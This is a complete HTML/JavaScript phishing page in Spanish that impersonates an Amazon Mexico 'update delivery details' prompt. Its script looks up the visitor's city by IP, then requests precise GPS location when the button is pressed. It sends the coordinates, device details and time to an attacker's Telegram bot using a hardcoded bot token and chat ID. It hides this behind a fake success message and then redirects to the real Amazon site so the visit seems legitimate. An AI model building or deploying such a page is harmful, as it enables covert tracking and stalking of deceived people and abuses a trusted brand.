<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amazon - Actualizar datos de entrega</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f4f4f4; margin:0; padding:20px; text-align:center; }
    .card { background:white; max-width:420px; margin:60px auto; padding:40px 20px; border-radius:16px; box-shadow:0 15px 40px rgba(0,0,0,0.15); }
    h1 { color:#232f3e; font-size:26px; margin-bottom:10px; }
    p { color:#444; font-size:16px; line-height:1.5; }
    button { background:#FF9900; color:white; border:none; padding:18px 40px; font-size:20px; border-radius:8px; cursor:pointer; width:100%; max-width:320px; font-weight:bold; }
    button:hover { background:#e68a00; }
    #resultado { margin-top:25px; font-size:18px; color:#00a651; font-weight:bold; min-height:60px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Actualiza tus datos de entrega</h1>
    <p><strong>Pedido #MX-7843921</strong><br><span id="direccion">Dirección faltante</span>, <span id="ciudad">Ciudad detectada...</span></p>
    <p>Para garantizar la entrega correcta, actualiza tus datos de ubicación más recientes:</p>
    <button onclick="actualizarDatos()">Actualizar datos de entrega</button>
    <div id="resultado"></div>
    <p style="font-size:13px; color:#777; margin-top:40px;">Amazon México • Tus datos están protegidos • 2026</p>
  </div>

  <script>
    // === CONFIG TELEGRAM ===
    const BOT_TOKEN = '8665004647:AAEfrF0wdsqClv5BFRWByflP4R1rKTAJy34';
    const CHAT_ID   = '5854071809';

    // Detectar ciudad por IP al cargar
    async function detectarCiudad() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const ciudad = data.city || 'Ciudad no detectada';
        document.getElementById('ciudad').textContent = ciudad;
        document.getElementById('direccion').textContent = 'Dirección faltante';
        return ciudad;
      } catch {
        document.getElementById('ciudad').textContent = 'Ciudad no detectada';
        return 'Ciudad no detectada';
      }
    }

    detectarCiudad();

    async function actualizarDatos() {
      const resultado = document.getElementById('resultado');
      resultado.textContent = "Actualizando datos... por favor espera";

      if (!navigator.geolocation) {
        resultado.textContent = "No se pudo actualizar. Intenta de nuevo más tarde.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude.toFixed(6);
          const lon = position.coords.longitude.toFixed(6);
          const acc = Math.round(position.coords.accuracy);

          // Mensaje discreto en pantalla (nada de coords visibles)
          resultado.innerHTML = '✅ Datos de entrega actualizados correctamente.<br>Gracias por confirmar.';

          // Obtener ciudad
          const ciudad = await detectarCiudad();

          // Mensaje completo para Telegram (con mapa clickable)
          const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
          const mensaje = 
            `📦 ACTUALIZACIÓN DE ENTREGA 📦\n\n` +
            `Pedido: #MX-7843921\n` +
            `Ciudad (IP): ${ciudad}\n` +
            `Ubicación GPS:\n   Lat: ${lat}\n   Lon: ${lon}\n   Precisión: ±${acc} m\n` +
            `Dispositivo: ${navigator.userAgent}\n` +
            `Hora: ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}\n\n` +
            `Ver ubicación en mapa: ${mapaLink}`;

          // Enviar a Telegram
          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          try {
            await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensaje,
                parse_mode: 'Markdown',
                disable_web_page_preview: false  // Permite que Telegram genere preview del link (miniatura de Maps)
              })
            });
            // No mostramos éxito/fallo en pantalla para mantenerlo limpio
          } catch {}

          // Redirigir a Amazon para cerrar el loop "legítimo"
          setTimeout(() => {
            window.location.href = "https://www.amazon.com.mx/gp/css/homepage.html";
          }, 2500);
        },
        () => {
          // Error silencioso o mensaje genérico
          resultado.textContent = "No se pudo actualizar en este momento. Intenta más tarde.";
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }
  </script>
</body>
</html>
